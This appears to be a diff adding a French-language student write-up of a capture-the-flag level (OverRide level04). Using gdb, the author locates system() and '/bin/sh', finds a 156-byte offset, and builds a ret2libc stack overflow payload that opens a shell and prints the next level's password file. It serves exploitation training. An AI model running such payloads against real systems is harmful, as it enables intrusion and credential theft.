@@ -1,0 +1,80 @@
+du coup je regarde le code mais je ne trouve pas de bin/sh je vois que ca parle de fork par contre
+a voir ce qu'on peut faire avec ca
+
+je vais voir si il n'y a pas un moyen de trouver le bin/sh sinon on va etre bien embeter 
+plutot rapide j'ai tapper how find bin/sh et j'ai trouver ca on va try
+
+(gdb) break main
+(gdb) run
+(gdb) print &system
+$1 = (<text variable, no debug info> *) 0xf7e68250 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f86c4c
+
+CA MARCHE merci
+
+(gdb) break main
+Breakpoint 1 at 0x80486cd
+(gdb) r
+Starting program: /home/users/level04/level04 
+
+Breakpoint 1, 0x080486cd in main ()
+(gdb) print &system
+$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+(gdb) find &system,+9999999,"bin/sh"
+0xf7f897ed
+
+\xed\x97\xf8\xf7
+
+on a aussi le system() du coup qui est
+0xf7e6aed0
+\xd0\xae\xe6\xf7
+
+on doit trouver maintenant un overwrite mais vue qu'il y a un fork je sais pas comment faire je vais voir sur internet
+
+http://sourceware.org/gdb/onlinedocs/gdb/Forks.html
+
+je vais m'aider de ce lien
+qui dit de set un follow fork mode child
+
+(gdb) set follow-fork-mode child
+
+et maintenant il faut essayer de le faire exit en testant des chiffre 
+dans le code j'ai cru voir 32 je vais try
+r <<< $(python -c "print 'A'*32")
+ca a pas segfault je vai try si ca peut segfault deja
+
+
+r <<< $(python -c "print 'A'*99999")
+Program received signal SIGSEGV, Segmentation fault.
+
+ok bon plus ca tatoner
+
+100 pas segfault
+150 non plus
+200 Segmentation
+
+OK JE SUIS con j'avais oublier qu'il y avait un site super pour trouver facilement
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+du coup je prend length 200
+
+r <<< $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'")
+offset = 156
+
+du coup plus ca try
+
+bon apres plein de test je tombe sur ca
+level04@OverRide:~$ (python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7' + 'aaaa' + '\xed\x97\xf8\xf7'"; cat - ) | ./level04
+Give me some shellcode, k
+sh: 1: bin/sh: Permission denied
+
+ca doit etre mon adresse de bin qui est mauvaise je vais changer a la main ^^
+bon ba j'ai diminuer de 1 et ca marche logique en vrai
+
+
+level04@OverRide:~$ (python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7' + 'aaaa' + '\xec\x97\xf8\xf7'"; cat - ) | ./level04
+Give me some shellcode, k
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+NICE CA
